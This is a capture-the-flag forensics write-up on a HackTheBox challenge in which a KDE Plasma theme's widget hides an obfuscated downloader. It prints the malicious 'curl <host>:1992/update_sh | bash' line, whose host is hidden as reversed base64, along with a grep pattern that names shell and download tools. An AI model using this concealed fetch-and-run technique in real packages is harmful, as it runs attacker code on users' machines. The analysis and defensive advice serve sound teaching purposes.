## Overview

`Sp00ky Theme` is a Very Easy HackTheBox **Forensics** challenge. You download a
festive KDE Plasma global theme plus a couple of widgets, and afterwards "strange
things" start happening. The catch is that a Plasma theme is not just artwork — it
ships a widget (a *plasmoid*) that runs JavaScript and can execute shell commands.
The solve is pure static analysis: find the malicious code in the bundle and reverse
the obfuscation hiding its command-and-control host.

## The technique

A KDE Plasma plasmoid is QML + JavaScript, and QML can run arbitrary shell commands
through a DataSource declared with `engine: 'executable'`. That means installing a
third-party theme is the same trust decision as running an unknown program — this is
[embedded malicious code](https://cwe.mitre.org/data/definitions/506.html)
([CWE-506](https://cwe.mitre.org/data/definitions/506.html)).

The bundle is mostly decoy `.svgz` icons. The interesting code lives in the custom
`org.kde.netspeedWidget` plasmoid, which declares two `engine: 'executable'`
DataSources and hides a downloader in `contents/code/utils.js`. The command-and-control
host is stored as a **reversed base64** string so it does not show up as a plain URL to
a naive search.

## Solution

Unzip the bundle (password `hackthebox`) and grep only the executable code, ignoring
the icon noise:

```bash
grep -rniE "engine: ?'executable'|eval|atob|base64 -d|rev \| base64|curl|wget|/dev/tcp|bash" \
  . --include='*.js' --include='*.qml'
```

The hit in `contents/code/utils.js` is a classic second-stage downloader:

```js
const PLASMOID_UPDATE_SOURCE =
  "UPDATE_URL=$(echo 952MwBHNo9lb0M2X0FzX/Eycz02MoR3X5J2XkNjb3B3eCRFS | rev | base64 -d); curl $UPDATE_URL:1992/update_sh | bash"
```

It reverses a base64 blob to recover a host, then runs `curl <host>:1992/update_sh | bash`.
Reverse the obfuscation exactly the way the malware does:

```bash
echo '952MwBHNo9lb0M2X0FzX/Eycz02MoR3X5J2XkNjb3B3eCRFS' | rev | base64 -d
# -> HTB{...}
```

The decoded "update URL" *is* the flag. A small script reads the blob straight out of
the JavaScript and decodes it so the answer is derived, not eyeballed.

Create `solve.py`:

```python
#!/usr/bin/env python3
import base64, re, pathlib

js = pathlib.Path("files/plasma/plasmoids/org.kde.netspeedWidget/contents/code/utils.js").read_text()
blob = re.search(r"echo\s+([A-Za-z0-9+/=]+)\s*\|\s*rev", js).group(1)
print(base64.b64decode(blob[::-1]).decode())
```

```bash
python3 solve.py
# HTB{...}
```

## Why it worked

Desktop themes, plasmoids, and editor/browser extensions all execute code when they
load, and almost nobody audits a "theme." The author leaned on that trust to plant a
downloader, then obfuscated the C2 indicator with `rev | base64 -d` so a keyword or URL
grep would miss it. Decoding the string by hand is the entire solve — and here the
decoded host doubled as the flag.

## Fix / defense

- Treat third-party themes, plasmoids, and extensions as untrusted software, not
  inert assets. Install only signed bundles from trusted repositories.
- Before `plasmapkg --install`, unzip the bundle and grep for shell-exec sinks
  (`engine: 'executable'`) and obfuscated strings (`rev | base64 -d`, `tac`, `xxd -r`,
  `String.fromCharCode`).
- Sandbox/AppArmor-confine the desktop shell so a widget cannot freely spawn `curl`/`bash`.
